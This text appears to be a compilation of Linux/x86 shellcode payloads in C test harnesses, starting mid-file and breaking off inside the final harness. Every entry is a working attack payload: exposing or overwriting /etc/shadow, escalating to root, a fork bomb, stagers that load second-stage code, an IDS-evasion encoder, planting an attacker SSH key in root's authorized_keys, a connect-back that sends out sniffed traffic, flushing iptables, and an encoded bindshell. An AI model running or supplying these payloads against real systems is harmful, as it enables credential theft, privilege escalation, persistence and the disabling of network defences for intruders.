 char shell[] = "\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50"
"\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
"\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01"
"\xb0\x0f\xcd\x80\x40\xcd\x80";

 printf("[*] Taille du ShellCode = %d\n", strlen(shell));
 (*(void (*)()) shell)();
 
 return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * Title: linux/x86 execve(/bin/cat, /etc/shadow, NULL) - 42 bytes
 * Type: Shellcode
 * Author: antrhacks
 * Platform: Linux X86
*/

/* ASSembly
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 2f 63 61 74       	push   $0x7461632f
 68 2f 62 69 6e       	push   $0x6e69622f
 89 e3                	mov    %esp,%ebx
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 2f 2f 73 68       	push   $0x68732f2f
 68 2f 65 74 63       	push   $0x6374652f
 89 e1                	mov    %esp,%ecx
 50                   	push   %eax
 51                   	push   %ecx
 53                   	push   %ebx
 89 e1                	mov    %esp,%ecx
 b0 0b                	mov    $0xb,%al
 cd 80
*/

int main(){
char shell[] =
"\x31\xc0"
"\x50"
"\x68\x2f\x63\x61\x74"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x50"
"\x68\x61\x64\x6f\x77"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x65\x74\x63"
"\x89\xe1"
"\x50"
"\x51"
"\x53"
"\x89\xe1"
"\xb0\x0b"
"\xcd\x80";

 printf("[*] Taille du ShellCode = %d\n", strlen(shell));
 (*(void (*)()) shell)();
 
 return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * Title: linux/x86 Shellcode Polymorphic - setuid(0) + chmod("/etc/shadow",0666) Shellcode 61 Bytes  
 * Encode  : _ADD
 * Author: antrhacks
 * Platform: Linux X86
*/

/* 0riginAl ASSembly
 31 db                	xor    %ebx,%ebx
 b0 17                	mov    $0x17,%al
 cd 80                	int    $0x80
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 63 2f 73 68       	push   $0x68732f63
 68 2f 2f 65 74       	push   $0x74652f2f
 89 e3                	mov    %esp,%ebx
 66 b9 b6 01          	mov    $0x1b6,%cx
 b0 0f                	mov    $0xf,%al
 cd 80                	int    $0x80
 40                   	inc    %eax
 cd 80                	int    $0x80
*/


#include "stdio.h"

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x37\x80\x6c\x0e\xff\x13"
                   "\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
                   "\x44\xee\xc3\x2a\xe0\x93\x44\xd3\x63\x7b\x74\x77"
                   "\x82\x8a\x7b\x76\x42\x86\x7b\x7b\x42\x42\x78\x87"
                   "\x9c\xf6\x79\xcc\xc9\x14\xc3\x22\xe0\x93\x53\xe0"
                   "\x93"; 

int main()
{
        printf(" [*] Polymorphic Shellcode - length: %d\n",strlen(shellcode));
        (*(void(*)()) shellcode)();

        return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 | Title: Linux/x86 pwrite("/etc/shadow", hash, 32, 8) Shellcode 89 Bytes
 | Description: replace root's password with hash of "agix" in MD5
 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

#include <stdio.h>

char shellcode[] =
"\x31\xC9"            		//xor ecx,ecx
"\x51"              		//push ecx
"\x68\x61\x64\x6F\x77"   	//push dword 0x776f6461
"\x68\x63\x2F\x73\x68"      	//push dword 0x68732f63
"\x68\x2F\x2F\x65\x74" 		//push dword 0x74652f2f
"\x89\xE3"               	//mov ebx,esp
"\x66\xB9\x91\x01"         	//mov cx,0x191
"\x31\xC0"               	//xor eax,eax
"\xB0\x05"               	//mov al,0x5
"\xCD\x80"               	//int 0x80
"\x89\xC3"               	//mov ebx,eax
"\xEB\x12" 			//jmp short 0x34
"\x59" 				//pop ecx
"\x31\xC0"               	//xor eax,eax
"\x31\xD2"               	//xor edx,edx
"\xB2\x20"               	//mov dl,0x20
"\xB0\xB5"               	//mov al,0xb5
"\x31\xF6"               	//xor esi,esi
"\x6A\x08"            		//push byte +0x8
"\x5E"                 		//pop esi
"\x31\xFF"               	//xor edi,edi
"\xCD\x80"               	//int 0x80
"\xE8\xE9\xFF\xFF\xFF"      	//call 0x22
//db "IMMkmgi9$NuhPs1B8H5uz7kEOeKf2H1:"
"\x49\x4D\x4D\x6B\x6D\x67\x69\x39"
"\x24\x4E\x75\x68\x50\x73\x31\x42"
"\x38\x48\x35\x75\x7A\x37\x6B\x45"
"\x4F\x65\x4B\x66\x32\x48\x31\x3A";

int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



  /*
 | Title: Linux/x86 chmod(/etc/shadow, 0666) ASCII   Shellcode 443 Bytes

 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

#include <stdio.h>

char shellcode[] =
"LLLLhHEY!X5HEY!"
"HZTYRRRPTURWa-5lmm-2QQQ-8AAAfhRRfZ0p>0x?fh88fZ0p?fh  "
"fZ0pS0pH0p?fh55fZ0p@fhbbfZ0pA0pBfhyyfZ0pAfhwwfZ0pE0pB"
"fhDDfZ0pCfhddfZ0pU0pDfhzzfZ0pW0pDfhuufZ0pEfhhhfZ0pJ0p"
"FfhoofZ0pF0pMfhccfZ0pV0pGfhiifZ0pGfh//fZ0pL0pM0pHfhss"
"fZ0pIfhmmfZ0pIfhaafZ0pJfhHHfZ0pKfhnnfZ0pLfheefZ0pR0pN"
"0pOfhttfZ0pO0pN0xPfhVVfZ0pP0xQfh((fZ0pQfhPPfZ0pQfhfff"
"Z0pRfhFFfZ0pS0xSfhIIfZ0pTfhssfZ0pT0xTfhOOfZ0pV0xVfh22"
"fZ0pXfh  fZ0pX0xXfh@@fZ0pY0xY"

"c'est quoi ma note de secu ?";


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 | Title: Linux/x86 alphanumAric Bomb FORK Shellcode 117 Bytes
 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

/*
dec esp
        dec esp
        dec esp
        dec esp
        push dword 0x58494741
        pop eax
        xor eax, 0x58494741
        dec eax 
        pop edx
        push esp
        pop ecx 
        push eax
        push ecx
        push edx
        push eax
        push esp
        push ebp
        push edx
        push edi
        popad
        dec ecx
        push dword 0x45525649
        dec ecx
        xor [ecx], bh
        push word 0x5445
        pop dx
        xor [ecx], dh
        dec ecx
        xor [ecx], bh
        push word 0x4255
        pop dx
        xor[ecx], dh
        dec ecx
        xor [ecx], bh
        push word 0x3636
        pop dx
        xor [ecx], dh
        dec ecx
        push dword 0x6b6e756a
        xor [ecx], bh
        push word 0x5974
        pop dx
        xor [ecx], dh
        dec ecx
        push word 0x3636
        pop dx
        xor [ecx], dh
        dec ecx
        push word 0x776F
        pop dx
        xor [ecx], dh
        push esp
        push esi
        pop ecx
        xor [ecx + 116], bh
        push word 0x7065
        pop dx
        xor [ecx + 116], dh
        dec esp
*/


#include <stdio.h>


char shellcode[] =

"LLLLhAGIXX5AGIXHZTYPQRPTURWaIhIVREI09fhETfZ01I09fhUBfZ01I09fh66fZ01Ihjunk09fhtYfZ01Ifh66fZ01IfhowfZ01TVY0ytfhepfZ0qtL";


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) stagger that reads second stage shellcode (127 bytes maximum) from stdin - 14 bytes
 * _fkz / twitter: @_fkz 
 *
 * sc = "\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3"
 * 
 * Example of use:
 * (echo -ne "\xseconde stage shellcode\x"; cat) | ./stager
 */
 
 char shellcode[] = 
 
 		"\x6A\x7F"		//	push	byte	+0x7F
 		"\x5A"			//	pop		edx	
 		"\x54"			//	push	esp
 		"\x59"			//	pop		esp
 		"\x31\xDB"		//	xor		ebx,ebx
 		"\x6A\x03"		//	push	byte	+0x3
 		"\x58"			//	pop		eax
 		"\xCD\x80"		//	int		0x80
 		"\x51"			//	push	ecx
 		"\xC3";			//	ret

int main(int argc, char *argv[])
{
	void (*execsh)() = (void *)&shellcode;
	execsh();
	return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) stagger that reads second stage shellcode (127 bytes maximum) from stdin - 14 bytes
 * _fkz / twitter: @_fkz 
 *
 * sc = "\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3"
 * 
 * Example of use:
 * (echo -ne "\xseconde stage shellcode\x"; cat) | ./stager
 */
 
 char shellcode[] = 
 
 		"\x6A\x7F"		//	push	byte	+0x7F
 		"\x5A"			//	pop		edx	
 		"\x54"			//	push	esp
 		"\x59"			//	pop		esp
 		"\x31\xDB"		//	xor		ebx,ebx
 		"\x6A\x03"		//	push	byte	+0x3
 		"\x58"			//	pop		eax
 		"\xCD\x80"		//	int		0x80
 		"\x51"			//	push	ecx
 		"\xC3";			//	ret

int main(int argc, char *argv[])
{
	void (*execsh)() = (void *)&shellcode;
	execsh();
	return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    _  __                 __  ___      __
   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
   |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /
 /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/

 xenomuta\x40phreaker\x2enet
 http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 Description:
 a linux/x86 shellcode that forks a HTTP Server on port tcp/8800

 OS: Linux
 Arch: x86
 Length: 166 bytes
 Author: XenoMuta

 hola at:
  str0k3, garay, fr1t0l4y, emra.
  - God bless you all -
 
==== SOURCE CODE ====
.globl _start
_start:
	xor %eax, %eax
	mov $0x02, %al
	int $0x80
	test %eax, %eax
	jz socket
	xor %eax, %eax
	incb %al
	int $0x80
txt:
	pop %ecx
	movb $27, %dl
	int $0x80

close:
	movb $0x6, %al
	mov %esi, %ebx
	int $0x80

exit:
	mov $0x01, %al
	xor %ebx, %ebx
	int $0x80

socketcall:
	pop %esi
	mov $0x66, %al
	incb %bl
	mov %esp, %ecx
	int $0x80
	jmp *%esi

socket:
	cltd
	xor %eax, %eax
	xor %ebx, %ebx
	push $0x6
	push $0x1
	push $0x2
	call socketcall

bind:
	mov %eax, %edi
	xor %edx, %edx
	push %edx
	pushw $0x6022
	pushw %bx
	mov %esp, %ecx
	push $0x10
	push %ecx
	push %edi
	call socketcall

listen:
	inc %bl
	push $0x05
	push %edi
	call socketcall

accept:
	xor %ecx, %ecx
	push %edx
	push %edx
	push %edi
	call socketcall
	
fork:
	mov %eax, %esi
	xor %eax, %eax
	mov $0x02, %al
	int $0x80
	test %eax, %eax
	jz write

	xor %eax, %eax
	mov $0x06, %al
	mov %esi, %ebx
	int $0x80

	xor %eax, %eax
	xor %ebx, %ebx
	mov $0x04, %bl
	jmp accept

write:
	mov %esi, %ebx
	mov $0x04, %al
	call txt
	.string "HTTP/1.0 200\r\n\r\n<h1>:)</h1>"
==== SOURCE CODE ====
*/
char shellcode[] = "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74\x22\x31\xc0\xfe\xc0\xcd\x80\x59\xb2\x1b\xcd\x80\xb0\x06\x89\xf3\xcd\x80\xb0\x01\x31\xdb\xcd\x80\x5e\xb0\x66\xfe\xc3\x89\xe1\xcd\x80\xff\xe6\x99\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\xe8\xe5\xff\xff\xff\x89\xc7\x31\xd2\x52\x66\x68\x22\x60\x66\x53\x89\xe1\x6a\x10\x51\x57\xe8\xcf\xff\xff\xff\xfe\xc3\x6a\x05\x57\xe8\xc5\xff\xff\xff\x31\xc9\x52\x52\x57\xe8\xbb\xff\xff\xff\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74\x10\x31\xc0\xb0\x06\x89\xf3\xcd\x80\x31\xc0\x31\xdb\xb3\x04\xeb\xda\x89\xf3\xb0\x04\xe8\x85\xff\xff\xff\x48\x54\x54\x50\x2f\x31\x2e\x30\x20\x32\x30\x30\x0d\x0a\x0d\x0a\x3c\x68\x31\x3e\x3a\x29\x3c\x2f\x68\x31\x3e";

int main ()
{
	printf("Length: %d bytes\n", strlen(shellcode));
	int (*sc)() = (int (*)())shellcode;
	sc();
	return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    _  __                 __  ___      __
   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
   |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /
 /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/

 xenomuta\x40phreaker\x2enet
 http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 Description:
 linux/x86 Self-modifying ShellCode for IDS evasion
 creates int $0x80 syscalls on runtime.

 OS: Linux
 Arch: x86
 Length: 64 bytes ( 35 without /bin/sh payload )
 Author: XenoMuta

 hola at:
  str0k3, garay, fr1t0l4y, emra.
  - God bless you all -

=== SOURCE CODE ====
.globl _start
_start:
	jmp _findOut	
_WhereAmI:
	pop %edx	// Save our payload's address g20
	mov %edx, %esi	// and save it 4 later 
_loopMakeInt80s:
	mov (%edx), %eax
	cmpw $0x7dca, %ax	// Find this guy ( 0x7dca ) and 
	jne _no
	addw $0x303, %ax	// 0x7dca + 0x303 == 0x80cd ( int $0x80 )
	mov %eax, (%edx)
_no:
	incb %dl
	cmp $0x41414141, %eax	// Use 'AAAA' as end Marker.
	jne _loopMakeInt80s	
	jmp *%esi		// Jump to our converted code when done
_findOut:
	call _WhereAmI
_payload:			// Paste your shell code here and then replace 
	xor %edx, %edx		// "\xcd\x80" (int $0x80) for .ascii "\xca7d" 
	push $0xb		// and end with .ascii "AAAA" as end marker 
	pop %eax
	cltd
	push %edx
	push $0x68732f2f
	push $0x6e69622f
	mov %esp, %ebx
	push %edx
	push %ebx
	mov %esp,%ecx
	.ascii "\xca\x7d" // + 0x303 = 0xcd80 (int $0x80)
	.ascii "AAAA"
=== SOURCE CODE ====
*/


char shellcode[] = "\xeb\x1c\x5a\x89\xd6\x8b\x02\x66\x3d\xca\x7d\x75\x06\x66\x05\x03\x03\x89\x02\xfe\xc2\x3d\x41\x41\x41\x41\x75\xe9\xff\xe6\xe8\xdf\xff\xff\xff\x31\xd2\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xca\x7d\x41\x41\x41\x41";

int main ()
{
	printf("Length: %d bytes\n", strlen(shellcode));
	int (*sc)() = (int (*)())shellcode;
	sc();
	return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    _  __                 __  ___      __       
   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
   |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / 
 /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/  

 xenomuta\x40phreaker\x2enet
 http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 Description: 
 linux/x86 listens for shellcode on tcp/5555 and jumps to it
 OS: Linux
 Arch: x86
 Length: 83 bytes
 Author: XenoMuta

 greetz to: 
  str0k3 (tnx for your effort), emra (fragancia),
  fr1t0l4y (dejate ver), garay (no me olvido de los pobres ;p )
  - God bless you all -
*/
.global _start

_start:
	xor %ebx, %ebx
	mov %ebx, %eax

_socket:
	push $0x6
	push $0x1
	push $0x2
	mov $0x66, %al	
	incb %bl
	mov %esp, %ecx
	int $0x80

_bind:
	mov %eax, %edi
	xor %edx, %edx
	push %edx
	pushw $0xb315	/* 5555 */
	pushw %bx
	mov %esp, %ecx
	push $0x10
	push %ecx
	push %edi
	mov $0x66, %al
	incb %bl
	mov %esp, %ecx
	int $0x80

_listen:
	incb %bl
	push $0x1
	push %edi
	mov $0x66, %al
	incb %bl
	mov %esp, %ecx
	int $0x80

_accept:
	push %edx
	push %edx
	push %edi
	mov $0x66, %al
	incb %bl
	mov %esp, %ecx
	int $0x80
	mov %eax, %ebx

_read:
	mov $0x3, %al
	mov %esp, %ecx
	mov $0x7ff, %dx
	incb %dl
	int $0x80
	jmp *%ecx	/* Jump to our shellcode */





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 linux/x86 shellcode to append rsa key to /root/.ssh/authorized_keys2
 keys found at http://xenomuta.tuxfamily.org/exploits/authkey/ 
 ssh -i id_rsa_pwn root@pwned-host

 295 bytes
 by XenoMuta
     _  __                 __  ___      __       
    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
    |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / 
  /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/  

   xenomuta [ arroba ] phreaker [ punto ] net

  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg
  
 - God bless you all -

*/
unsigned char sc[] =
//<_start>:
"\x31\xd2"	 // xor    %edx,%edx
"\x52"		 // push   %edx
"\x68\x65\x79\x73\x32"	 // push   $0x32737965 ; /root/.ssh/authorized_keys2
"\x68\x65\x64\x5f\x6b"	 // push   $0x6b5f6465
"\x68\x6f\x72\x69\x7a"	 // push   $0x7a69726f
"\x68\x61\x75\x74\x68"	 // push   $0x68747561
"\x68\x73\x73\x68\x2f"	 // push   $0x2f687373
"\x68\x74\x2f\x2f\x2e"	 // push   $0x2e2f2f74
"\x68\x2f\x72\x6f\x6f"	 // push   $0x6f6f722f
"\x89\xe3"	 // mov    %esp,%ebx
"\x66\xb9\x41\x04"	 // mov    $0x441,%cx ; O_CREAT | O_APPEND | O_WRONLY
//<_open>:
"\x6a\x05"	 // push   $0x5 ; sys_open()
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
//<_write>:
"\x93"		 // xchg   %eax,%ebx
"\x89\xe6"	 // mov    %esp,%esi
"\x31\xd2"	 // xor    %edx,%edx
"\x52"		 // push   %edx
"\x6a\x0a"	 // push   $0xa
"\x68\x20\x78\x78\x78"	 // push   $0x78787820 ; contenido de id_rsa_pwn.pub
"\x68\x31\x35\x54\x4a"	 // push   $0x4a543531
"\x68\x56\x39\x48\x57"	 // push   $0x57483956
"\x68\x6d\x75\x2b\x38"	 // push   $0x382b756d
"\x68\x31\x35\x64\x31"	 // push   $0x31643531
"\x68\x64\x2f\x71\x69"	 // push   $0x69712f64
"\x68\x52\x4b\x61\x79"	 // push   $0x79614b52
"\x68\x70\x70\x79\x6e"	 // push   $0x6e797070
"\x68\x35\x46\x31\x6d"	 // push   $0x6d314635
"\x68\x55\x64\x5a\x35"	 // push   $0x355a6455
"\x68\x4d\x2b\x4c\x63"	 // push   $0x634c2b4d
"\x68\x38\x59\x41\x6d"	 // push   $0x6d415938
"\x68\x4d\x42\x50\x79"	 // push   $0x7950424d
"\x68\x4c\x44\x4d\x58"	 // push   $0x584d444c
"\x68\x41\x34\x31\x38"	 // push   $0x38313441
"\x68\x65\x33\x76\x4d"	 // push   $0x4d763365
"\x68\x48\x6f\x78\x77"	 // push   $0x77786f48
"\x68\x34\x6d\x46\x36"	 // push   $0x36466d34
"\x68\x48\x39\x6f\x39"	 // push   $0x396f3948
"\x68\x56\x59\x48\x6a"	 // push   $0x6a485956
"\x68\x4b\x41\x74\x6d"	 // push   $0x6d74414b
"\x68\x70\x7a\x64\x71"	 // push   $0x71647a70
"\x68\x50\x2b\x76\x4d"	 // push   $0x4d762b50
"\x68\x6c\x47\x51\x43"	 // push   $0x4351476c
"\x68\x50\x68\x4f\x32"	 // push   $0x324f6850
"\x68\x4d\x37\x48\x35"	 // push   $0x3548374d
"\x68\x76\x6b\x6c\x47"	 // push   $0x476c6b76
"\x68\x37\x74\x4f\x35"	 // push   $0x354f7437
"\x68\x54\x63\x6e\x77"	 // push   $0x776e6354
"\x68\x36\x63\x77\x65"	 // push   $0x65776336
"\x68\x6d\x62\x64\x71"	 // push   $0x7164626d
"\x68\x4e\x32\x75\x70"	 // push   $0x7075324e
"\x68\x74\x73\x6a\x58"	 // push   $0x586a7374
"\x68\x41\x47\x45\x41"	 // push   $0x41454741
"\x68\x49\x77\x41\x41"	 // push   $0x41417749
"\x68\x41\x41\x41\x42"	 // push   $0x42414141
"\x68\x63\x32\x45\x41"	 // push   $0x41453263
"\x68\x61\x43\x31\x79"	 // push   $0x79314361
"\x68\x42\x33\x4e\x7a"	 // push   $0x7a4e3342
"\x68\x41\x41\x41\x41"	 // push   $0x41414141
"\x68\x72\x73\x61\x20"	 // push   $0x20617372
"\x68\x73\x73\x68\x2d"	 // push   $0x2d687373
"\x89\xe1"	 // mov    %esp,%ecx
"\xb2\xa9"	 // mov    $0xa9,%dl
"\x6a\x04"	 // push   $0x4   ; sys_write()
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
"\x34\xaf"	 // xor    $0xaf,%al ; 0xa9 xor 0xaf = 0x6 ( sys_close() )
"\xcd\x80"	 // int    $0x80
"\x04\x0f"	 // add    $0xf,%al  ; sys_chmod()
"\x89\xf3"	 // mov    %esi,%ebx
"\x66\xb9\x80\x01"	 // mov    $0x180,%cx ; 0600  para que ssh no se queje
"\xcd\x80"	 // int    $0x80
"\x6a\x01"	 // push   $0x1      ; adios exit
"\x58"		 // pop    %eax
"\xcd\x80";	 // int    $0x80

main(){printf("%d bytes\n", strlen(sc));}
//main(){(*(void (*)()) sc)();}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 linux/x86 connect-back port UDP/54321 & dup2 &
 fork() & execve() /usr/bin/tcpdump -iany -w- "port ! 54321"
 151 bytes
 by XenoMuta
     _  __                 __  ___      __       
    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
    |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / 
  /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/  

   xenomuta [ arroba ] phreaker [ punto ] net

  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg
  
 - God bless you all -

*/
unsigned char sc[] =
// <_start>:
"\x6a\x66"	 // push   $0x66 ; socketcall()
"\x58"		 // pop    %eax  ; para setear el socket 
"\x6a\x01"	 // push   $0x1  
"\x5b"		 // pop    %ebx
"\x31\xc9"	 // xor    %ecx,%ecx
"\x51"		 // push   %ecx
"\x6a\x02"	 // push   $0x2  ; SOCK_DGRAM (udp)
"\x6a\x02"	 // push   $0x2   
"\x89\xe1"	 // mov    %esp,%ecx
"\xcd\x80"	 // int    $0x80
// IP: 127.1.1.1
"\x68\x7f\x01\x01\x01"	 // push   $0x101017f
// Port: 54321
"\x66\x68\xd4\x31"	 // pushw  $0x31d4
"\x66\x31\xc9"	 // xor    %cx,%cx
"\x80\xc1\x02"	 // xadd    $0x2,%cl
"\x66\x51"	 // push   %cx
"\x89\xe1"	 // mov    %esp,%ecx
"\x6a\x10"	 // push   $0x10
"\x51"		 // push   %ecx
"\x50"		 // push   %eax
"\x89\xe1"	 // mov    %esp,%ecx
"\x89\xc6"	 // mov    %eax,%esi
"\xb0\x66"	 // mov    $0x66,%al  ; socketcall ()
"\x80\xc3\x02"	 // add    $0x2,%bl   ; para connect()
"\xcd\x80"	 // int    $0x80
"\x87\xde"	 // xchg   %ebx,%esi  
"\x6a\x01"	 // push   $0x1
"\x59"		 // pop    %ecx
"\x6a\x3f"	 // push   $0x3f      ; dup2(socket, stdout)
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
"\x31\xd2"	 // xor    %edx,%edx  
"\x6a\x02"	 // push   $0x2       ; fork()
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
"\x39\xd0"	 // cmp    %edx,%eax  ; el hijo sobrevive
"\x74\x05"	 // je     0x4d <_child>
"\x6a\x01"	 // push   $0x1       ; adios papa
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
//<_child>:
"\x6a\x0b"	 // push   $0xb    ; execve() tcpdump -iany -w- "port ! 54321"
"\x58"		 // pop    %eax    ; sniffea todo menos a mi mismo.
"\x52"		 // push   %edx
"\x68\x34\x33\x32\x31"	 // push   $0x31323334 ; "port ! 54321"
"\x68\x20\x21\x20\x35"	 // push   $0x35202120
"\x68\x70\x6f\x72\x74"	 // push   $0x74726f70
"\x89\xe7"	 // mov    %esp,%edi
"\x52"		 // push   %edx
"\x6a\x2d"	 // push   $0x2d               ; -w- ( escribe a stdout )
"\x66\x68\x2d\x77"	 // pushw  $0x772d
"\x89\xe6"	 // mov    %esp,%esi
"\x52"		 // push   %edx
"\x6a\x79"	 // push   $0x79               ; -iany (todas las interfaces )
"\x68\x2d\x69\x61\x6e"	 // push   $0x6e61692d
"\x89\xe1"	 // mov    %esp,%ecx
"\x52"		 // push   %edx
"\x6a\x70"	 // push   $0x70
"\x68\x70\x64\x75\x6d"	 // push   $0x6d756470 ; /usr/bin/tcpdump
"\x68\x6e\x2f\x74\x63"	 // push   $0x63742f6e
"\x68\x2f\x73\x62\x69"	 // push   $0x6962732f
"\x68\x2f\x75\x73\x72"	 // push   $0x7273752f
"\x89\xe3"	 // mov    %esp,%ebx
"\x52"		 // push   %edx
"\x57"		 // push   %edi
"\x56"		 // push   %esi
"\x51"		 // push   %ecx
"\x53"		 // push   %ebx
"\x89\xe1"	 // mov    %esp,%ecx
"\xcd\x80";	 // int    $0x80


main(){(*(void (*)()) sc)();}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * 06/03/2003 
 * 
 * ( 45 bytes ) to flush iptables.
 *
 * _execve(/sbin/iptables -F)  by UnboundeD
 * greetz to s0t4ipv6.
 *
 */

char shellcode[] =

"\x31\xd2"                      // xorl         %edx,%edx
"\x52"                          // pushl        %edx
"\x66\x68\x2d\x46"              // pushw        $0x462d
"\x89\xe6"                      // movl         %esp,%esi
"\x52"                          // pushl        %edx
"\x68\x62\x6c\x65\x73"          // pushl        $0x73656c62
"\x68\x69\x70\x74\x61"          // pushl        $0x61747069
"\x89\xe7"                      // movl         %esp,%edi
"\x68\x62\x69\x6e\x2f"          // pushl        $0x2f6e6962
"\x68\x2f\x2f\x2f\x73"          // pushl        $0x732f2f2f
"\x89\xe3"                      // movl         %esp,%ebx
"\x52"                          // pushl        %edx
"\x56"                          // pushl        %esi
"\x57"                          // pushl        %edi
"\x89\xe1"                      // movl         %esp,%ecx
"\x31\xc0"                      // xorl         %eax,%eax
"\xb0\x0b"                      // movb         $0xb,%al
"\xcd\x80"                      // int          $0x80
;

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Bindshell puerto 5074 (TOUPPER EVASION)
 * 226 bytes
 * Bindshell original: Matias Sedalo (92 bytes)
 *
 * La binshell esta codificada usando 2 bytes para
 * representar 1 byte original de la siguiente forma:
 * byte original: 0xAB
 * 0x41 + 0xA = 0x4B; 0x41 + 0xB = 0x4C
 * byte codificado: [0x4B 0x4C]
 *
 * by Tora
 */

#include <stdio.h>
#include <ctype.h>

char shellcode[] = 
/* _start */
"\xeb\x02"			/* jmp short A          */

/* A */
"\xeb\x05"			/* jmp short C          */

/* B */
"\xe8\xf9\xff\xff\xff"		/* call A               */

/* C */
"\x5f"				/* pop edi              */
"\x81\xef\xdf\xff\xff\xff"	/* sub edi, 0xffffffdf  */
"\x57"				/* push edi             */
"\x5e"				/* pop esi              */
"\x29\xc9"			/* sub ecx, ecx         */
"\x80\xc1\xb8"			/* add cl, 0xb8         */

/* bucle */
"\x8a\x07"			/* mov al, byte [edi]   */
"\x2c\x41"			/* sub al, 0x41         */
"\xc0\xe0\x04"			/* shl al, 4            */
"\x47"				/* inc edi              */
"\x02\x07"			/* add al, byte [edi]   */
"\x2c\x41"			/* sub al, 0x41         */
"\x88\x06"			/* mov byte [esi], al   */
"\x46"				/* inc esi              */
"\x47"				/* inc edi              */
"\x49"				/* dec ecx              */
"\xe2\xed"			/* loop bucle           */
/* Shellcode codificada de 184 (0xb8) bytes */
"DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB"
"AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA"
"JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO"
"BLAALMNIA";

int main(void)
{
    int *ret;
    char *t;

